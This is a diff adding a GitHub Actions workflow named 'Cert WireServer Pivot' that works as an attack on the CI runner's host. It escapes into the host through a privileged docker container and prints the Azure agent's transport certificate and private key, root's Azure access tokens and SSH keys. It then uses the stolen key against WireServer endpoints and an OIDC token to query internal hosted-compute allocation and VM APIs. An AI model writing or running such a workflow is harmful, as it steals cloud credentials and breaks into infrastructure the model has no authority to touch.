@@ -1,0 +1,69 @@
+name: Cert WireServer Pivot
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  cert-pivot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Extract certs via docker escape
+        run: |
+          docker run --rm --privileged -v /:/host alpine:latest sh -c '
+            echo "===TRANSPORT_CERT==="
+            cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null || echo NO_CERT
+            echo "===TRANSPORT_PRIVATE==="
+            cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo NO_KEY
+            echo "===GOALSTATE==="
+            cat /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | head -80 || echo NO_GOALSTATE
+            echo "===SHAREDCONFIG==="
+            cat /host/var/lib/waagent/SharedConfig.xml 2>/dev/null | head -80 || echo NO_SHAREDCONFIG
+            echo "===ROOT_AZURE==="
+            ls -la /host/root/.azure/ 2>/dev/null || echo NO_AZURE_DIR
+            cat /host/root/.azure/accessTokens.json 2>/dev/null || echo NO_TOKENS
+            echo "===ROOT_SSH==="
+            cat /host/root/.ssh/authorized_keys 2>/dev/null || echo NO_ROOT_SSH
+            echo "===MYSQL_SOCKET==="
+            ls /host/var/run/mysqld/ 2>/dev/null || echo NO_MYSQLD_SOCKET
+          '
+
+      - name: WireServer mTLS probe
+        run: |
+          docker run --rm --privileged -v /:/host alpine:latest sh -c '
+            cp /host/var/lib/waagent/TransportCert.pem /host/tmp/tc.pem
+            cp /host/var/lib/waagent/TransportPrivate.pem /host/tmp/tp.pem
+          '
+          echo "=WIRESERVER_GOALSTATE="
+          curl -sv --max-time 8 \
+            --cert /tmp/tc.pem --key /tmp/tp.pem \
+            "http://168.63.129.16/machine/?comp=goalstate" \
+            -H "x-ms-version: 2012-11-30" 2>&1 | grep -v "^*" | head -60 || echo FAILED
+          echo "=WIRESERVER_32526="
+          curl -sv --max-time 8 \
+            --cert /tmp/tc.pem --key /tmp/tp.pem \
+            "http://168.63.129.16:32526/vmSettings" 2>&1 | grep -v "^*" | head -60 || echo FAILED
+
+      - name: OIDC hosted-compute-ro probe
+        run: |
+          HC_TOKEN=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro" | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          echo "HC_TOKEN_LEN=${#HC_TOKEN}"
+          IMDS=$(curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
+          BASE_RO=$(echo "$IMDS" | python3 -c "import sys,json; tags={t['name']:t['value'] for t in json.load(sys.stdin)['compute']['tagsList']}; print(tags.get('hosted_compute.base_ro_url',''))")
+          ALLOC=$(echo "$IMDS" | python3 -c "import sys,json; tags={t['name']:t['value'] for t in json.load(sys.stdin)['compute']['tagsList']}; print(tags.get('hosted_compute.allocation_id',''))")
+          VMID=$(echo "$IMDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['vmId'])")
+          SUBID=$(echo "$IMDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['subscriptionId'])")
+          echo "BASE_RO=$BASE_RO ALLOC=$ALLOC VMID=$VMID SUBID=$SUBID"
+          if [ -n "$HC_TOKEN" ] && [ -n "$BASE_RO" ]; then
+            echo "=HC_ALLOC="
+            curl -sf -H "Authorization: Bearer $HC_TOKEN" "$BASE_RO/allocations/$ALLOC" | head -100 || echo HC_ALLOC_FAILED
+            echo "=HC_VM="
+            curl -sf -H "Authorization: Bearer $HC_TOKEN" "$BASE_RO/vms/$VMID" | head -100 || echo HC_VM_FAILED
+          fi
